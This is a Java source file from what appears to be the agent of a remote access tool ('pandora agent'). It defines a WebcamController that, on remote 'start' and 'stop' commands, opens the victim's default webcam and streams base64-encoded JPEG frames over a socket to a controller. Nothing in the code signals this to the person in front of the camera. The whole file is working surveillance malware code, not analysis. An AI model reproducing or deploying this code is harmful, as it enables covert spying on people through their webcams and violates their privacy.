package org.pandora.agent.control.impl;

import com.github.sarxos.webcam.Webcam;
import org.pandora.agent.Client;

import javax.imageio.ImageIO;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Base64;

public class WebcamController {

    private final Client client;
    private int total;
    private long lastImage;
    private boolean sending;

    public WebcamController(final Client client) {
        this.client = client;
        this.total = 0;
        this.lastImage = System.currentTimeMillis();
        this.sending = false;
    }

    public void execute(final String string) {
        switch (string) {
            case "start":
                this.total++;
                if (!this.sending) this.run();
                break;
            case "stop":
                if (this.total > 0) this.total--;
                break;
        }
    }

    private void run() {
        this.sending = true;
        while (this.total > 0 && this.sending) {
            if ((System.currentTimeMillis() - this.lastImage) > 1) {
                String response = null;
                if (Webcam.getDefault() != null) {
                    final Webcam webcam = Webcam.getDefault();
                    webcam.open();
                    try {
                        if (webcam.getImage() != null) {
                            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                            ImageIO.write(webcam.getImage(), "JPG", byteArrayOutputStream);
                            response = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
                            this.lastImage = System.currentTimeMillis();
                        }
                    } catch (final IOException | IllegalArgumentException ignored) {
                    }
                } else response = "No camera";
                if (response != null)
                    this.client.getSocketUtils().write("webcam:" + this.client.getComputer().lastUuid + ":" + response);
            }
        }
        if (Webcam.getDefault() != null && Webcam.getDefault().isOpen()) Webcam.getDefault().close();
        this.sending = false;
    }
}